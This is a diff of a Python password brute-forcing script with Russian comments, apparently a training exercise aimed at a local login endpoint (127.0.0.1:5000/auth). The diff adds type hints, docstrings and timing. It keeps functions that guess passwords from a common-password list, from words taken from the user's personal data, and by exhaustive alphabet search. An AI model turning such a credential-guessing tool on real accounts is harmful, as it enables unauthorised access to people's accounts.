@@ -5,8 +5,7 @@ import time
 import itertools
 import requests
 
-
-BAD_PASSWORD_FILE = './test.txt'
+BAD_PASSWORD_FILE = './common_passwords.txt'
 URLS = ['https://www.avito.ru/',
         'https://www.speedtest.net/',
         'https://djbook.ru/',
@@ -45,14 +44,14 @@ def test_url(what_url: Text, count: int = 10, sleep_time: int = 1) -> float:
 
 
 def get_alphabet():
-    """Вернет состоящий из цифр и прописных символов англ. алфавита"""
+    """Вернет алфавит состоящий из цифр и прописных символов англ. алфавита"""
     let = ''.join([chr(i) for i in range(97, 97 + 26)])
     numbers = '0123456789'
     alphabet = numbers + let
     return alphabet
 
 
-def translated(source: str):
+def translated(source: Text) -> Text:
     """Транслитерация руссуих букв"""
     source = source.lower()
     rus = list('абвгдеёжзийклмнопрстуфхцчшщъыьэюя')
@@ -79,7 +78,8 @@ def rewrite_date(date: Text) -> Text:
     return date
 
 
-def get_self_user_words(name: Text):
+def get_self_user_words(name: Text) -> Iterator:
+    """Вернет гениратор перебирающий сочитания слов из данных о пользователе"""
     words = []
     if name in USER_DATA:
         words = USER_DATA[name]['user_name'].split(' ')
@@ -96,7 +96,7 @@ def get_self_user_words(name: Text):
                 result = ''.join(subset)
                 yield result
 
-    return words
+    raise StopIteration
 
 
 def get_self_user_alphabet(name):
@@ -121,6 +121,7 @@ def encode(number, alphabet):
 
 
 def get_bruteforce(alphabet):
+    """Гениратор перебора по алфавиту"""
     counter = 0
     while True:
         counter += 1
@@ -168,22 +169,10 @@ def is_valid(name: Text, password: Text, url: Text) -> bool:
         return False
 
 
-def search_by_alphabet(name: Text, url: Text, alphabet: Text):
-    bust_gen = get_bruteforce(alphabet=alphabet)
-    while True:
-        password = next(bust_gen)
-        if not password:
-            # при помощи словаря ничего не нашли
-            break
-        if is_valid(name, password, url):
-            return password
-    return None
-
-
-def search_by_gen(name: Text, url: Text, genirator: Iterator):
+def search_by_gen(name: Text, url: Text, generator: Iterator):
     password = '1'
     while password:
-        password = next(genirator)
+        password = next(generator)
         if not password:
             break
         if is_valid(name, password, url):
@@ -191,14 +180,18 @@ def search_by_gen(name: Text, url: Text, genirator: Iterator):
     return None
 
 
-def hack_password(name, url):
+def hack_password(name:Text, url:Text)->Text:
     """Подбор пароля  для name на url"""
     bad_gen = get_bad_passwords(BAD_PASSWORD_FILE)
     print('Ищем по файлу')
-    password = search_by_gen(name, url, bad_gen)  # поиск по файлу плохих паролей
-    if password:
-        return password
-    if name in USER_DATA:
+    try:
+        password = search_by_gen(name, url, bad_gen)  # поиск по файлу плохих паролей
+        if password:
+            return password
+    except StopIteration:
+        print('Закончили с файлом - ничего не нашли')
+
+    if name in USER_DATA:  # есть информация о пользователе
         print('Ищем по словам пользователя')
         user_words_gen = get_self_user_words(name)
         password = search_by_gen(name, url, user_words_gen)  # поиск по словам в информации о пользователе
@@ -220,11 +213,14 @@ def hack_password(name, url):
 
 
 def main():
+    start_time = time.monotonic()
     user_names = ['admin', 'jack', 'cat', 'test']
     url = 'http://127.0.0.1:5000/auth'
     for name in user_names:
         user_password = hack_password(name, url)
         print(f'for {name} I found {user_password} password')
+    delta = time.monotonic() - start_time
+    print(f'Время в полете - {delta}')
 
 
 if __name__ == '__main__':
